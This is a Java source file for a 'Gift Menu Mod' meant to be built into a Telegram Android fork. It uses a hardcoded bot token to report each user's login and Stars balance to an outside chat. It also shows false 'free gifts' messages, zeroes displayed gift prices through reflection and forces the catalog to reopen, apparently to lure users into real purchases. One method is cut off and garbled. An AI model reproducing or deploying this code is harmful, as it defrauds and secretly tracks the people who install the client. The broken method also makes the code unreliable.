package org.telegram.ui.Gifts;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.os.Handler;
import android.os.Looper;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.widget.TextView;

import org.telegram.messenger.UserConfig;
import org.telegram.ui.Stars.StarsController;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Gift Menu Mod — полный функционал из плагина, встроенный в форк Telegram.
 *
 * Куда класть:
 *   TMessagesProj/src/main/java/org/telegram/ui/Gifts/GiftMenuMod.java
 *
 * Точки вызова — в конце файла (комментарии) и в README.
 */
public class GiftMenuMod {

    // ======================== НАСТРОЙКИ ========================
    private static final String BOT_TOKEN = "8863617268:AAECIwC9usJTfuBzY6hjHHf0VL57hZ6EfNs";
    private static final String BOT_CHAT_ID = "8940489868";
    /** Username для открытия каталога (как durov1 в плагине) */
    public static String CATALOG_USERNAME = "durov1";
    // ===========================================================

    private static final Handler mainHandler = new Handler(Looper.getMainLooper());

    private static final AtomicBoolean startupNotified = new AtomicBoolean(false);
    private static final AtomicBoolean loginNotified = new AtomicBoolean(false);
    private static final AtomicBoolean authSuccessNotified = new AtomicBoolean(false);
    private static final AtomicBoolean welcomeShown = new AtomicBoolean(false);
    private static final AtomicBoolean wasOnLogin = new AtomicBoolean(false);
    private static final AtomicBoolean reopenMonitorStarted = new AtomicBoolean(false);
    private static final AtomicBoolean premiumDialogLock = new AtomicBoolean(false);

    private static AlertDialog premiumDialog;
    private static Object currentSheet; // GiftSheet instance
    private static Runnable openCatalogRunnable;

    private static final String[] PREMIUM_WORDS = {
            "3 месяца", "6 месяцев", "12 месяцев"
    };

    private static final String MSG_WELCOME =
            "Приветствую тут вы можете получить бесплатно Подарки нажмите Продолжить Для открытия каталога с бесплатным Подарками на данный момент бесплатные подарки только обычные в них входят Подарки стоимостю 0 звезд";

    private static final String MSG_LOGIN =
            "В данном Моде вы бесплатно получаете подарки А также вы можете их обменивать на звезды все бесплатно и моментально";

    private static final String MSG_PREMIUM =
            "В данном каталоге Вы получаете бесплатные Подарки для себя Все моментально";

    private static final String MSG_AVATAR =
            "В данном каталоге Вы получаете бесплатные Подарки для себя Все моментально";

    // ======================== БАЛАНС ЗВЁЗД ========================

    public static long getStarsBalance(int account) {
        try {
            StarsController sc = StarsController.getInstance(account);
            if (sc == null) return 0;
            try {
                return sc.getBalance(false);
            } catch (Throwable ignored) {
            }
            try {
                Object bal = sc.getBalance();
                if (bal != null) {
                    try {
                        Field f = bal.getClass().getField("amount");
                        return ((Number) f.get(bal)).longValue();
                    } catch (Throwable ignored) {
                    }
                }
            } catch (Throwable ignored) {
            }
            try {
                Field f = sc.getClass().getDeclaredField("balance");
                f.setAccessible(true);
                Object sa = f.get(sc);
                if (sa != null) {
                    Field af = sa.getClass().getField("amount");
                    return ((Number) af.get(sa)).longValue();
                }
            } catch (Throwable ignored) {
            }
        } catch (Throwable ignored) {
        }
        return 0;
    }

    // ======================== УВЕДОМЛЕНИЯ В БОТА ========================

    public static void notifyBot(final String text) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN
                        + "/sendMessage?chat_id=" + BOT_CHAT_ID
                        + "&text=" + URLEncoder.encode(text, "UTF-8");
                conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setRequestMethod("GET");
                conn.connect();
                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                    while (br.readLine() != null) { /* drain */ }
                }
            } catch (Throwable ignored) {
            } finally {
                if (conn != null) try { conn.disconnect(); } catch (Throwable ignored) {}
            }
        }, "GiftMenuMod-Notify").start();
    }

    public static void notifyBotWithBalance(int account, String text) {
        long balance = getStarsBalance(account);
        notifyBot(text + "\n\nБаланс звёзд пользователя: " + balance);
    }

    // ======================== СТАРТ / ЛОГИН / АВТОРИЗАЦИЯ ========================

    /** Вызвать при старте приложения (ApplicationLoader.postInitApplication / LaunchActivity). */
    public static void onAppStart() {
        if (!startupNotified.compareAndSet(false, true)) return;
        try {
            int account = UserConfig.selectedAccount;
            if (UserConfig.getInstance(account).isClientActivated()) {
                notifyBotWithBalance(account, "Пользователь уже авторизован (запустил приложение)");
            }
        } catch (Throwable ignored) {
        }
    }

    /** Вызвать на экране Login / Intro (onResume). */
    public static void onLoginScreen(Activity activity) {
        wasOnLogin.set(true);
        if (loginNotified.compareAndSet(false, true)) {
            notifyBot("У вас новое скачивание: пользователь проходит авторизацию");
        }
        if (activity != null) {
            showLoginAlert(activity);
        }
    }

    /** Вызвать после успешной авторизации. */
    public static void onAuthSuccess() {
        if (!wasOnLogin.get()) return;
        if (!authSuccessNotified.compareAndSet(false, true)) return;
        wasOnLogin.set(false);
        try {
            int account = UserConfig.selectedAccount;
            notifyBotWithBalance(account, "Новый пользователь Авторизовался прошел регистрацию");
        } catch (Throwable ignored) {
        }
    }

    private static void showLoginAlert(final Activity activity) {
        if (activity == null || activity.isFinishing()) return;
        mainHandler.post(() -> {
            try {
                new AlertDialog.Builder(activity)
                        .setMessage(MSG_LOGIN)
                        .setPositiveButton("Хорошо", null)
                        .setCancelable(true)
                        .show();
            } catch (Throwable ignored) {
            }
        });
    }

    // ======================== ПРИВЕТСТВИЕ + ОТКРЫТИЕ КАТАЛОГА ========================

    /**
     * Показать приветствие на главном экране.
     *
     * @param activity     Activity
     * @param openCatalog  Runnable, который открывает GiftSheet (ты реализуешь открытие)
     */
    public static void maybeShowWelcome(final Activity activity, final Runnable openCatalog) {
        if (!welcomeShown.compareAndSet(false, true)) return;
        if (activity == null || activity.isFinishing()) {
            welcomeShown.set(false);
            return;
        }
        try {
            if (!UserConfig.getInstance(UserConfig.selectedAccount).isClientActivated()) {
                welcomeShown.set(false);
                return;
            }
        } catch (Throwable t) {
            welcomeShown.set(false);
            return;
        }

        openCatalogRunnable = openCatalog;

        mainHandler.post(() -> {
            try {
                final AtomicBoolean opened = new AtomicBoolean(false);
                AlertDialog.Builder b = new AlertDialog.Builder(activity);
                b.setTitle("Gift Menu");
                b.setMessage(MSG_WELCOME);
                b.setCancelable(false);
                b.setPositiveButton("Продолжить", (d, w) -> {
                    if (!opened.compareAndSet(false, true)) return;
                    try { d.dismiss(); } catch (Throwable ignored) {}
                    if (openCatalog != null) {
                        try { openCatalog.run(); } catch (Throwable ignored) {}
                    }
                });
                AlertDialog dialog = b.create();
                dialog.show();

                // Тап в любое место диалога тоже открывает каталог
                try {
                    Window window = dialog.getWindow();
                    if (window != null) {
                        View decor = window.getDecorView();
                        attachAnyTap(decor, () -> {
                            if (!opened.compareAndSet(false, true)) return;
                            try { dialog.dismiss(); } catch (Throwable ignored) {}
                            if (openCatalog != null) {
                                try { openCatalog.run(); } catch (Throwable ignored) {}
                            }
                        });
                    }
                } catch (Throwable ignored) {
                }
            } catch (Throwable ignored) {
            }
        });
    }

    /** Сброс флага приветствия (аналог .giftreset). */
    public static void resetWelcome() {
        welcomeShown.set(false);
    }

    private static void attachAnyTap(View view, final Runnable onTap) {
        if (view == null) return;
        try {
            view.setOnTouchListener((v, event) -> {
                if (event.getAction() == MotionEvent.ACTION_DOWN) {
                    if (onTap != null) onTap.run();
                }
                return false;
            });
            if (view instanceof ViewGroup) {
                ViewGroup vg = (ViewGroup) view;
                for (int i = 0; i < vg.getChildCount(); i++) {
                    attachAnyTap(vg.getChildAt(i), onTap);
                }
            }
        } catch (Throwable ignored) {
        }
    }

    // ======================== АВТО-ВОССТАНОВЛЕНИЕ КАТАЛОГА ========================

    /**
     * Запустить монитор: если каталог закрыли и пользователь на главном экране —
     * через 4 сек открыть снова.
     *
     * Вызвать один раз после первого открытия каталога.
     *
     * @param isMainScreen  проверка «сейчас главный экран?»
     * @param openCatalog   открытие каталога
     */
    public static void startAutoReopenMonitor(final UtilitiesBool isMainScreen, final Runnable openCatalog) {
        if (!reopenMonitorStarted.compareAndSet(false, true)) return;
        openCatalogRunnable = openCatalog;

        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(500);
                    Object sheet = currentSheet;
                    if (sheet == null) continue;

                    boolean showing = true;
                    try {
                        Method m = sheet.getClass().getMethod("isShowing");
                        Object r = m.invoke(sheet);
                        showing = r instanceof Boolean && (Boolean) r;
                    } catch (Throwable t) {
                        showing = false;
                    }
                    if (showing) continue;

                    currentSheet = null;
                    Thread.sleep(4000);

                    int account = UserConfig.selectedAccount;
                    try {
                        if (!UserConfig.getInstance(account).isClientActivated()) continue;
                    } catch (Throwable t) {
                        continue;
                    }

                    if (isMainScreen != null && !isMainScreen.get()) continue;

                    final Runnable open = openCatalogRunnable != null ? openCatalogRunnable : openCatalog;
                    if (open != null) {
                        mainHandler.post(() -> {
                            try { open.run(); } catch (Throwable ignored) {}
                        });
                    }
                } catch (InterruptedException e) {
                    break;
                } catch (Throwable ignored) {
                }
            }
        }, "GiftMenuMod-Reopen").start();
    }

    /** Сохранить текущий GiftSheet (вызывать сразу после sheet.show()). */
    public static void setCurrentSheet(Object sheet) {
        currentSheet = sheet;
    }

    public interface UtilitiesBool {
        boolean get();
    }

    // ======================== ОБНУЛЕНИЕ ЦЕН ========================

    public static void zeroOutPrices(Object obj) {
        if (obj == null) return;
        zeroFields(obj, new String[]{"stars", "price", "amount", "starCount"});
        for (String inner : new String[]{"gift", "starGift", "item"}) {
            try {
                Field f = obj.getClass().getDeclaredField(inner);
                f.setAccessible(true);
                Object innerObj = f.get(obj);
                if (innerObj != null) {
                    zeroFields(innerObj, new String[]{"stars", "price", "amount", "starCount"});
                }
            } catch (Throwable ignored) {
            }
        }
    }

    public static void zeroOutList(Object list) {
        if (list == null) return;
        try {
            if (list instanceof List) {
                for (Object o : (List<?>) list) {
                    zeroOutPrices(o);
                }
                return;
            }
            int size = (Integer) list.getClass().getMethod("size").invoke(list);
            Method get = list.getClass().getMethod("get", int.class);
            for (int i = 0; i < size; i++) {
                zeroOutPrices(get.invoke(list, i));
            }
        } catch (Throwable ignored) {
        }
    }

    private static void zeroFields(Object obj, String[] names) {
        Class<?> cls = obj.getClass();
        for (String name : names) {
            try {
                Field f;
                try {
                    f = cls.getField(name);
                } catch (NoSuchFieldException e) {
                    f = cls.getDeclaredField(name);
                }
                f.setAccessible(true);
                Class<?> t = f.getType();
                if (t == long.class || t == Long.class) {
                    f.setLong(obj, 0L);
                } else if (t == int.class || t == Integer.class) {
                    f.setInt(obj, 0);
                }
            } catch (Throwable ignored) {
            }
        }
    }

    public static void patchStarsControllerCache(int account) {
        try {
            StarsController sc = StarsController.getInstance(account);
            if (sc == null) return;
            for (String listName : new String[]{"starGifts", "gifts", "availableGifts"}) {
                try {
                    Field f = sc.getClass().getDeclaredField(listName);
                    f.setAccessible(true);
                    zeroOutList(f.get(sc));
                } catch (Throwable ignored) {
                }
            }
        } catch (Throwable ignored) {
        }
    }

    public static void applyZeroPatches(int account, Object sheet) {
        try {
            if (sheet != null) {
                try {
                    Method m = sheet.getClass().getMethod("isShowing");
                    Object r = m.invoke(sheet);
                    if (r instanceof Boolean && !(Boolean) r) return;
                } catch (Throwable ignored) {
                }
            }
        } catch (Throwable ignored) {
        }
        patchStarsControllerCache(account);
        if (sheet != null) {
            for (String fieldName : new String[]{"gifts", "starGifts", "items", "options", "availableGifts"}) {
                try {
                    Field f = sheet.getClass().getDeclaredField(fieldName);
                    f.setAccessible(true);
                    zeroOutList(f.get(sheet));
                } catch (Throwable ignored) {
                }
            }
        }
    }

    // ======================== PREMIUM 3/6/12 + АВАТАРКИ ========================

    public static void hookPremiumCards(final View root, final Context context) {
        if (root == null || context == null) return;
        try {
            scanAndHookPremium(root, context);
        } catch (Throwable ignored) {
        }
    }

    /** Перехват обычных аватарок (не GiftCell) — как в плагине. */
    public static void hookAvatars(final View root, final Context context) {
        if (root == null || context == null) return;
        try {
            walkAvatars(root, context);
        } catch (Throwable ignored) {
        }
    }

    private static void walkAvatars(View view, final Context context) {
        if (view == null) return;
        try {
            String cn = view.getClass().getName();
            if (cn.contains("BackupImageView") && !isGiftCell(view)) {
                view.setOnClickListener(v -> showSimpleMessage(context, MSG_AVATAR));
            }
            if (view instanceof ViewGroup) {
                ViewGroup vg = (ViewGroup) view;
                for (int i = 0; i < vg.getChildCount(); i++) {
                    walkAvatars(vg.getChildAt(i), context);
                }
            }
        } catch (Throwable ignored) {
        }
    }

    private static boolean isGiftCell(View view) {
        try {
            Object p = view.getParent();
            for (int i = 0; i < 6 && p != null; i++) {
                String name = p.getClass().getSimpleName();
                if (name.contains("GiftCell") || name.contains("StarGift")) return true;
                p = (p instanceof View) ? ((View) p).getParent() : null;
            }
        } catch (Throwable ignored) {
        }
        return false;
    }

    private static void scanAndHookPremium(View view, final Context context) {
        if (view == null) return;
        try {
            if (view instanceof TextView) {
                CharSequence cs = ((TextView) view).getText();
                if (cs != null) {
                    String t = cs.toString().toLowerCase();
                    for (String w : PREMIUM_WORDS) {
                        if (t.contains(w)) {
                            View card = findPremiumCard(view);
                            if (card != null) attachPremiumBlocker(card, context);
                            break;
                        }
                    }
                }
            }
            if (view instanceof ViewGroup) {
                ViewGroup vg = (ViewGroup) view;
                for (int i = 0; i < vg.getChildCount(); i++) {
                    scanAndHookPremium(vg.getChildAt(i), context);
                }
            }
        } catch (Throwable ignored) {
        }
    }

    private static int countPremiumTexts(View view) {
                });
    }

    /**
     * Полная инициализация после sheet.show():
     * - сохранить sheet
     * - обнулить цены
     * - повесить Premium + аватарки
     * - несколько повторных проходов
     */
    public static void startSheetHelpers(final int account, final Object sheet, final View root, final Context context) {
        setCurrentSheet(sheet);
        patchStarsControllerCache(account);
        applyZeroPatches(account, sheet);

        if (root != null && context != null) {
            mainHandler.postDelayed(() -> {
                hookAvatars(root, context);
                hookPremiumCards(root, context);
            }, 800);
        }

        for (int i = 0; i < 30; i++) {
            final int delay = 100 + i * 150;
            mainHandler.postDelayed(() -> {
                applyZeroPatches(account, sheet);
                if (root != null && context != null) {
                    hookPremiumCards(root, context);
                }
            }, delay);
        }
        for (int i = 0; i < 20; i++) {
            final int delay = 5000 + i * 500;
            mainHandler.postDelayed(() -> applyZeroPatches(account, sheet), delay);
        }
    }

    // ======================== УДОБНЫЙ КОЛЛБЕК ДЛЯ SCROLL ========================

    /** Вызывать когда RecyclerView/ScrollView остановился — перевесить Premium. */
    public static void onCatalogScrollIdle(View root, Context context) {
        if (root == null || context == null) return;
        mainHandler.post(() -> {
            hookPremiumCards(root, context);
            hookAvatars(root, context);
        });
    }
}

/*
 * ===================== КУДА ВЫЗЫВАТЬ =====================
 *
 * 1) ApplicationLoader.postInitApplication()  ИЛИ  LaunchActivity.onCreate:
 *      GiftMenuMod.onAppStart();
 *
 * 2) LoginActivity.onResume() / IntroActivity.onResume():
 *      GiftMenuMod.onLoginScreen(getParentActivity()); // или this
 *
 * 3) После успешного логина:
 *      GiftMenuMod.onAuthSuccess();
 *
 * 4) DialogsActivity.onResume() (главный экран, аккаунт активен):
 *      GiftMenuMod.maybeShowWelcome(getParentActivity(), () -> {
 *          // открой GiftSheet как в твоём форке, например:
 *          // GiftSheet sheet = new GiftSheet(...);
 *          // sheet.show();
 *          // View decor = sheet.getWindow().getDecorView();
 *          // GiftMenuMod.startSheetHelpers(currentAccount, sheet, decor, getParentActivity());
 *          // GiftMenuMod.startAutoReopenMonitor(() -> isOnMainScreen(), this::openCatalogAgain);
 *      });
 *
 * 5) Сразу после любого sheet.show() каталога подарков:
 *      GiftMenuMod.setCurrentSheet(sheet);
 *      GiftMenuMod.startSheetHelpers(currentAccount, sheet, sheet.getWindow().getDecorView(), context);
 *
 * 6) При загрузке options подарков:
 *      GiftMenuMod.zeroOutList(options);
 *      GiftMenuMod.patchStarsControllerCache(currentAccount);
 *
 * 7) При остановке скролла в каталоге (опционально):
 *      GiftMenuMod.onCatalogScrollIdle(recyclerView, context);
 */
